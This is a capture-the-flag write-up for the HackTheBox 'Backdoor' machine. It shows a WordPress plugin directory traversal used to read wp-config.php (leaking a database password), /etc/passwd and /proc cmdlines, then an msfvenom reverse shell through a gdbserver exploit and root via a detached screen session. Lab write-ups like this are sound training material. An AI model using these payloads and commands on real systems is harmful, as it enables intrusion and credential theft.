---
layout: post
title: "HTB: Backdoor"
author: Andrew Cherney
date: 2023-02-16 17:35:05
tags: easy-box htb linux webapp wordpress plugins 
icon: "assets/icons/backdoor.png"
post_description: "This box involves quite a bit of enumeration and creativity to solve for an easy box. First you need to identify the plugins of the wordpress site, then identify the vulnerable one. After that the processes are to be read and scoured for a foothold after discovering a vulnerable service on port 1337. Root can then be obtained by attaching a detached root screen."
---

<h1>Summary</h1>

{{ page.post_description }}

<h1>Enumeration</h1>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Backdoor]
└──╼ $nmap -Pn -sC 10.10.11.125
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-16 17:44 CST
Nmap scan report for 10.10.11.125
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1

Nmap done: 1 IP address (1 host up) scanned in 19.01 seconds
```

<h2>Port 80 - http</h2>

{% include img_link src="/img/backdoor/front_page" alt="front_page" ext="png" trunc=500 %}

There is a basic wordpress site with nothing immediately out of the ordinary. I toss out a dirb scan but only the usual files and directories reveal themselves. A good place from here is to look at what plugins (if any) are being run. 

<h2>Wordpress Plugins</h2>

![plugin screen](/img/backdoor/wp_content.png)

<h3>ebook-download</h3>

Well there is something here. I throw out a search on exploit-db and would you believe I find [this directory traversal vulnerability](https://www.exploit-db.com/exploits/39575). There is a php file named **filedownload.php** that I can use **../..** to travel up directories and download anything that www-data can access. Obvious next step here is to grab **wp-config.php** and look for hard coded passwords, then read **/etc/passwd**. 

```
http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd
```

wp-config contained:

```
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
```

**/etc/passwd** for a potential user contained:

```
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```

I suppose I can try to login, but that password does not work for user. Additionally those names do not work with the password to login to Wordpress. Okay, so my guess here is the SQL service that these credentials work with is exposed and didn't trip in the initial scan.

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Backdoor]
└──╼ $nmap -Pn -sC 10.10.11.125 -p 1337
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-16 19:06 CST
Nmap scan report for 10.10.11.125
Host is up (0.048s latency).

PORT     STATE SERVICE
1337/tcp open  waste
```

<h2>Process Reading</h2>

Well that's not SQL, probably useful though. From here I have the ability to read files accessible to www-data and I need to use it to gain more knowledge somehow. The best thing I could think of is **/proc** contains all running processes and I can read <code>/proc/#/cmdline</code> to see what commands or services are active. I'll boot up burpsuite and fuzz the process numbers and go from there. 

```
http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/#/cmdline
```

I will alternatively write a bash script since it will be quicker and I can use grep to sort out results.

```
#!/bin/bash

for i in {1..2000}
do
curl "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/$i/cmdline" > ./prc/$i
done
```

<h1>User as user</h1>

<h2>gdbserver RCE</h2>

```
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Backdoor/prc]
└──╼ $grep -iR --text "1337"
853:../../../../../../proc/853/cmdline../../../../../../proc/853/cmdline../../../../../../proc/853/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done<script>window.close()</script>
```

That service on port 1337 is gdbserver. Okay ... if I search that service on exploit-db and find an RCE script of a specific version. I need to make a payload with msfvenom, then run the python script and set up a listener. Let's give this a shot. 

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Backdoor]
└──╼ $msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=7777 PrependFork=true -o rev.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Saved as: rev.bin
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Backdoor]
└──╼ $python3 gdbexploit.py 10.10.11.125:1337 rev.bin 
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Backdoor]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.125] 44424
whoami
user
cat user.txt
de65d53143451-------------------
```

<h1>Root</h1>

<h2>screen</h2>

While I was scouring through the processes I did come across one for the command screen. 

```bash
ps -aux | grep screen
root         857  0.0  0.0   2608  1836 ?        Ss   Feb16   0:05 /bin/sh -c while true;do sleep
 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
```

This seems to imply there is a root screen that is currently detached. To gain root I need to create a terminal, and then export a TERM for screen to default to, then attach the root session. It took a little troubleshooting but <code>script /dev/null</code> fixes an error that screen sometimes has.

```bash
script /dev/null                                                                
Script started, file is /dev/null                                               
$ export TERM=xterm                                                             
export TERM=xterm                                                               
$ screen -r root/root  
root@Backdoor:~# cat /root/root.txt                                             
cat /root/root.txt                                                              
fdb2aa71188f4-------------------
```

